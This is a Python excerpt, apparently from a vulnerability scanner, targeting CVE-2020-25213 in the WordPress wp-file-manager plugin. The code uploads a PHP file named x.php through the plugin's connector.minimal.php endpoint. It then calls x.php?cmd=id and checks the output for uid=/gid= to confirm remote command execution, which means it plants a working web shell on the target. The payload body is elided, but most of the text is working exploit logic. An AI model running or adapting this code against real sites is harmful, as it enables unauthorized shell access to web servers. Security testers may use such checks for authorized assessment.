...
class Cve_2020_25213:
    def get_url(self,input_url):
        try:
            shell = input_url + "/wp-content/plugins/wp-file-manager/lib/files/x.php?cmd=id"
            burp0_url = input_url + "/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php"
            burp0_headers = {"User-Agent": self.headers["User-Agent"], "Accept": "*/*",
            ...
            requests.post(burp0_url, headers=burp0_headers, data=burp0_data,verify=self.ssl,proxies=self.proxy)
            if "uid=" in str(requests.get(shell,verify=self.ssl,proxies=self.proxy,headers=self.headers).text) and "gid=" in str(requests.get(shell,verify=self.ssl,proxies=self.proxy,headers=self.headers).text):
                OutPrintInfoSuc("WordPress", f'目标存在CVE-2020-25213文件上传漏洞: {shell}')
                if not self.batch:
                    OutPrintInfo("WordPress", f'Data:\n {burp0_data}')
                else:
                    OutPutFile("wordpress_2020_25213.txt",f'目标存在CVE-2020-25213文件上传漏洞: {shell}')

                return True
            else:
                if not self.batch:
                    OutPrintInfo("WordPress", f'目标不存在CVE-2020-25213文件上传漏洞')
                return False
    ...
    def main(self,target):
        ...
        if not self.batch:
            OutPrintInfo("WordPress", '开始检测CVE-2020-25213文件上传漏洞...')
        self.get_url(url)
        if not self.batch:
            OutPrintInfo("WordPress", 'CVE-2020-25213文件上传漏洞检测结束')
